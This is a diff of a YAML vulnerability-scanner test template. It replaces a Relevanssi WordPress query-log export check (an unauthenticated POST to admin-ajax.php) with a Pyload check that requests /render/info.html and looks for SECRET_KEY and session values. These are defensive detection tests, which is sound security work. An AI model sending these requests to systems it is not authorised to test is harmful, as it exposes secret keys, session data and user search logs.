@@ -1,19 +1,14 @@
-id: RELEVANSSI_SEARCH_WORDPRESS_PLUGIN_QUERY_LOG_EXPORT
+id: PYLOAD_FLASK_CONFIG_ACCESS_CONTROL
 info:
-  name: "Relevanssi Search WordPress Plugin Query Log Export Vulnerability"
-  description: > 
-    "This test affects the Relevanssi plugin by exposing sensitive search query logs. This vulnerability allows unauthorized users to access and export these logs, potentially revealing private search terms and user behavior. Exploiting this issue can lead to the unintended disclosure of confidential information and compromise user privacy."
-  details: >
-    "This vulnerability is a flaw in the Relevanssi plugin that permits unauthorized access to search query logs. This vulnerability allows attackers to export these logs without proper authentication or authorization checks. As a result, sensitive information about user search queries can be exposed, posing a risk to user privacy and potentially revealing insights into site activity and user behavior."
-  impact: >
-    "The impact of this vulnerability includes the potential exposure of sensitive search data and user behavior. Unauthorized access to these logs can lead to privacy breaches, as attackers might obtain confidential information about users' search activities. This can compromise user confidentiality, expose personal interests or patterns, and damage the site's overall security and reputation."
-
+  name: "Pyload Flask Config Unauthenticated Access"
+  description: "This test refers to a security vulnerability in Pyload, a download management system using Flask. This issue arises when the configuration endpoint of Pyload's Flask application is exposed without proper authentication, potentially allowing unauthorized users to access sensitive configuration settings. Exploiting this vulnerability could lead to unauthorized changes or exposure of critical information." 
+  details: "This vulnerability occurs when the Flask-based Pyload application exposes its configuration interface without requiring user authentication. This can allow attackers to access or modify sensitive configuration settings, such as API keys or server credentials. Exploiting this flaw can lead to unauthorized access to the system, potentially compromising its security and integrity."
+  impact: "The impact of this vulnerability can be significant, as it allows unauthorized users to access or alter critical configuration settings. This exposure can lead to unauthorized control over the Pyload application, potentially compromising data security, altering system settings, or enabling further attacks. The vulnerability increases the risk of system compromise and data breaches."
   category:
     name: NO_AUTH
     shortName: Broken Authentication
     displayName: Broken User Authentication (BUA)
-  subCategory: RELEVANSSI_SEARCH_WORDPRESS_PLUGIN_QUERY_LOG_EXPORT
-  severity: HIGH
+  subCategory: PYLOAD_FLASK_CONFIG_ACCESS_CONTROL
   tags:
     - Business logic
     - OWASP top 10
@@ -23,16 +18,16 @@ info:
     - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
     - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
   cwe:
-    - CWE-89
+    - CWE-287
   cve:
-    - CVE-2024-1380
+    - CVE-2024-21644
 
 api_selection_filters:
-  response_code:
-    gte: 200
-    lte: 300
   method:
     neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
   response_payload:
     length:
       gt: 0
@@ -65,31 +60,21 @@ api_selection_filters:
       - multiple failed attempts
   url:
     extract: urlVar
-  request_headers:
-    for_one:
-      key:
-        eq: content-type
-        extract: contentTypeHeader
 execute:
   type: single
   requests:
-  - req:
-    - modify_method: POST
-    - replace_body: 'action=&relevanssi_export=1'
-    - modify_header:
-        contentTypeHeader: "application/x-www-form-urlencoded; charset=UTF-8"
-    - modify_url: ${urlVar}/wp-admin/admin-ajax.php
+  - req: 
+    - modify_method: GET
+    - modify_url: ${urlVar}/render/info.html
 validate:
   response_code:
     eq: 200
   response_payload:
     length:
-      gt: 0  
+      gt: 0
     contains_all:
-      - filename=relevanssi_log.csv
-      - application/download
-      - user_id
-      - session_id 
+      - "&#39;SECRET_KEY&#39;:"
+      - "&#39;pyload_session&#39;"
     not_contains:
       - Error
       - Internal Server 
@@ -117,3 +102,4 @@ validate:
       - account is locked
       - account is blocked
       - multiple failed attempts
+   
